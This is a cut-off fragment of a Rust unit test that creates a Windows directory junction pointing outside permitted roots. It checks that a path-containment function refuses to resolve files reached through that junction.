            let junction = root.join("sent").join("jn");
            let status = std::process::Command::new("cmd")
                .args(["/C", "mklink", "/J"])
                .arg(&junction)
                .arg(&target)
                .output();
            assert!(status.is_ok_and(|o| o.status.success()), "mklink /J 不需要管理员权限，应能建成");
            assert!(junction.join("x.png").exists());
            assert!(resolve_within(&roots, &junction.join("x.png")).is_none(), "junction 指向外面应被拒");
            let _ = std::fs::remove_dir(&junction);
        }
        let _ = std::fs::remove_dir_all(&base);
    }
}
